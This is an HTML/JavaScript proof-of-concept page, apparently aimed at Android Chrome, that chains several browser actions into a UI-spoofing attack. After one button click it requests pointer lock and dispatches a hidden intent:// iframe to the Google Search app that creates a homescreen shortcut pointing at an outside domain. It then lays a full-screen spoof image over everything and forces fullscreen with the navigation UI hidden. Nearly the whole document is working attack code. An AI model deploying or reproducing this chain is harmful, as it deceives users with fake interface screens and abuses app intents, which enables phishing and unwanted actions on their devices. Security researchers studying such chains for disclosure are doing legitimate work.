<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
    <title>Ultimate Chaining & Intent Spoof PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }
      #fullscreenElement {
        position: relative;
        width: 100%;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #1a73e8;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(26, 115, 232, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #1557b0; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
      #spoof {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        min-width: 100vw;
        min-height: 100vh;
        object-fit: cover;
        z-index: 2147483647;
        pointer-events: none;
      }
      #pointerLockElement {
        width: 1px;
        height: 1px;
        position: absolute;
        opacity: 0;
      }
    </style>
    <script>
      addEventListener("touchstart", (event) => {});
      window.ontouchstart = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.focus();
      };

      addEventListener("touchend", (event) => {});
      window.ontouchend = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.blur();
      };
    </script>
  </head>
  <body>
    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <div id="pointerLockElement"></div>

    <div id="fullscreenElement">
      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">

      <div class="container" id="mainContainer">
        <button id="execBtn">INITIALIZE INTENT & CHAINING</button>
        <div class="info" id="statusInfo">Status: Ready for interaction.</div>
      </div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = async function () {
        statusInfo.innerText = "Status: Executing intent & security context chaining...";
        this.style.display = "none";

        try {
          // 1. Chaining Step 1: Pointer Lock Activation
          let plElement = document.getElementById("pointerLockElement");
          if (plElement && plElement.requestPointerLock) {
            await plElement.requestPointerLock().catch((err) => {
              console.debug("PointerLock chained catch:", err.message);
            });
          }

          // 2. Chaining Step 2: Intent URI Dispatcher (Menggunakan payload Android Intent NDevTK)
          let spoofFrame = document.createElement("iframe");
          spoofFrame.style.display = "none";
          spoofFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
          document.body.appendChild(spoofFrame);

          // 3. Chaining Step 3: Instan menampilkan visual overlay spoof.png di atas konteks dialog
          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          statusInfo.innerText = "Status: Overlay deployed. Engaging chained Fullscreen lock...";

          // 4. Chaining Step 4: Eksekusi Fullscreen dengan jeda mikro yang dioptimalkan
          setTimeout(async () => {
            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;

            let requestFS = fsElement.requestFullscreen || 
                            fsElement.webkitRequestFullscreen || 
                            fsElement.mozRequestFullScreen || 
                            fsElement.msRequestFullscreen;

            if (requestFS) {
              try {
                await requestFS.call(fsElement, { navigationUI: "hide" });
              } catch (err) {
                try {
                  await requestFS.call(fsElement);
                } catch (e) {
                  console.debug("Fullscreen chain fallback error:", e.message);
                }
              }
            }

            let container = document.getElementById("mainContainer");
            if (container) {
              container.style.display = "none";
            }

            statusInfo.innerText = "Status: Full chaining active with Android intent dispatch.";
          }, 300);

        } catch (err) {
          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
          execButton.style.display = "block";
        }
      };
    </script>
  </body>
</html>
